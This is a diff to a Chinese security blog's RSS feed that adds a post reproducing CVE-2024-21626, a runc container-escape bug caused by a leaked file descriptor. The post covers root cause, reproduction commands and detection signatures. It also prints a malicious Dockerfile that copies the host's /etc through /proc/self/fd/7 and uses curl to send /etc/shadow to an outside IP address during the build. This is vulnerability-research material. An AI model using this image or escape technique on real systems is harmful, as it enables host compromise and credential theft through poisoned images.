@@ -1,4 +1,56 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVE on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/cve/</link><description>Recent content in CVE on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 30 Jul 2023 22:39:23 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/cve/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2023-38646复现</title><link>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</link><pubDate>Sun, 30 Jul 2023 22:39:23 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</guid><description>&lt;p>twi上看到了这个洞 而且还是Pre-auth RCE，想赶着热乎的尝试分析一下、结果踩了个坑——官方的patch并没有在github源码中 而是直接包含在了release文件中，也是没有经验，最终独立复现以失败告终&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVE on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/cve/</link><description>Recent content in CVE on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Mar 2024 23:48:23 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/cve/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2024-21626复现</title><link>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</link><pubDate>Sun, 24 Mar 2024 23:48:23 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</guid><description>&lt;p>公告：&lt;a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">several container breakouts due to internally leaked fds&lt;/a>&lt;/p>
+&lt;p>影响范围：runc &amp;gt;=v1.0.0-rc93,&amp;lt;=1.1.11&lt;/p>
+&lt;p>额外要求：linux内核版本大于5.6 (uname -r)&lt;/p>
+&lt;p>检查方式&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213163353866.png" alt="image-20240213163353866">&lt;/p>
+&lt;h2 id="runc">runc&lt;/h2>
+&lt;p>docker中的默认runtime是runc，它是基于OCI specification编写的一个容器底层运行时，可以手动替换为安全性更高、隔离性更强的gvisor(runc)，也是基于OCI规范 可以无缝切换&lt;/p>
+&lt;p>作为底层工具，当runc出现问题会影响docker和k8s&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;p>&lt;code>prepareOpenat2&lt;/code>函数会检查&lt;code>openat2&lt;/code>这个syscall能否被正常调用，若失败 进入到&lt;code>openFallback&lt;/code>，若成功 则用&lt;code>unix.Openat2&lt;/code>系统调用打开&lt;code>/sys/fs/cgroup&lt;/code>，这里的&lt;code>unix.Openat2&lt;/code>是有&lt;code>O_CLOEXEC&lt;/code>flag的&lt;/p>
+&lt;p>如果成功打开&lt;code>/sys/fs/cgroup&lt;/code>，必然有一个fd指向该文件夹，但&lt;code>prepareOpenat2&lt;/code>函数执行完之后并没有把这个fd正常关闭 也没有返回 导致泄露&lt;/p>
+&lt;p>利用思路：runc创建子进程时 &amp;amp;&amp;amp; exec/run即将执行的二进制文件还没关闭之前，将process.cwd设置为&lt;code>/proc/self/fd/7&lt;/code>，此时这个二进制进程的&lt;code>/proc/[pid]/cwd&lt;/code>就会指向容器外的&lt;code>/sys/fs/cgroup&lt;/code>，之后的子进程就可以利用该fd的&lt;code>/proc/self/fd/[fdnum]&lt;/code>来访问宿主机的文件系统&lt;/p>
+&lt;p>至于最初为什么要检查&lt;code>openat2&lt;/code>，是因为&lt;code>openat(2)&lt;/code>可以避免在容器的mount命名空间中挂载宿主机文件系统的目录时存在逃逸的风险，但最终又引入了新的问题&lt;/p>
+&lt;h2 id="复现">复现&lt;/h2>
+&lt;p>可以不使用完整docker 直接复现runc漏洞&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将基本镜像导出rootfs&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --name helper-ctr alpine
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#111">export&lt;/span> helper-ctr --output alpine.tar
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir rootfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar xf alpine.tar -C rootfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 使用runc命令创建默认配置文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>runc spec
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 修改运行时指定的cwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -ri &lt;span style="color:#d88200">&amp;#39;s#(\s*&amp;#34;cwd&amp;#34;: )&amp;#34;(/)&amp;#34;#\1 &amp;#34;/proc/self/fd/7&amp;#34;#g&amp;#39;&lt;/span> config.json
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>grep cwd config.json
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># exploit&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo runc --log ./log.json run demo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213174402355.png" alt="image-20240213174402355">&lt;/p>
+&lt;p>注意到我们把cwd指定为&lt;code>/proc/self/fd/7&lt;/code>，这个数字和golang运行时有关&lt;/p>
+&lt;p>0, 1, 2分别是标准输入 标准输出和标准错误，3是日志文件，golang程序刚启动时会创建一个epoll文件描述符4和一个管道(5, 6)，接着初始化cgroup管理模块时打开&lt;code>/sys/fs/cgroup&lt;/code>目录7&lt;/p>
+&lt;p>但在使用docker run创建的容器中 &lt;code>/sys/fs/cgroup&lt;/code>的文件描述符是8，但有时也是7（详细原因暂略 看不懂）&lt;/p>
+&lt;p>另外一个细节是&lt;code>--log&lt;/code>，如果不指定log参数 &lt;code>/sys/fs/cgroup&lt;/code>目录的文件描述符就会是3，无法利用（原因略 看不懂）&lt;/p>
+&lt;h2 id="利用">利用&lt;/h2>
+&lt;p>利用过程中的几条特征&lt;/p>
+&lt;ul>
+&lt;li>在容器中产生cwd 形如&lt;code>/proc/self/fd/[fd]&lt;/code>的进程&lt;/li>
+&lt;li>在容器中产生目标目录为&lt;code>/proc/self/fd/[fd]&lt;/code>的&lt;code>symlink(2)&lt;/code>或&lt;code>symlinkat(2)&lt;/code>的系统调用&lt;/li>
+&lt;li>在容器中产生open/openat/openat2系统调用，且文件名有&lt;code>/proc/\d+/cwd/.*&lt;/code> 的正则表达式特征&lt;/li>
+&lt;/ul>
+&lt;p>利用场景（主要针对云服务）：&lt;/p>
+&lt;ul>
+&lt;li>制作恶意镜像 投毒公共库&lt;/li>
+&lt;li>CI/CD平台控制work dir 导致漏洞&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>FROM ubuntu:latest
+WORKDIR /proc/self/fd/7
+RUN cp -r ../../../../../etc /hostetc
+WORKDIR /
+RUN apt update &amp;amp;&amp;amp; apt-get install -y --no-install-recommends curl ca-certificates
+RUN curl -XPOST --data-binary @/hostetc/shadow http://165.154.148.13:10399/
+&lt;/code>&lt;/pre>&lt;p>以上恶意镜像 在build阶段就可以把敏感文件带出 无需实际运行&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213212602227.png" alt="image-20240213212602227">&lt;/p>
+&lt;p>参考文章：https://github.com/NitroCao/CVE-2024-21626&lt;/p></description></item><item><title>CVE-2023-38646复现</title><link>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</link><pubDate>Sun, 30 Jul 2023 22:39:23 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/30/cve-2023-38646/</guid><description>&lt;p>twi上看到了这个洞 而且还是Pre-auth RCE，想赶着热乎的尝试分析一下、结果踩了个坑——官方的patch并没有在github源码中 而是直接包含在了release文件中，也是没有经验，最终独立复现以失败告终&lt;/p>
 &lt;p>下面是根据其他师傅的文章来复现，嘛 也算不亏 毕竟知识是学到了√&lt;/p>
 &lt;hr>
 &lt;h2 id="前置">前置&lt;/h2>
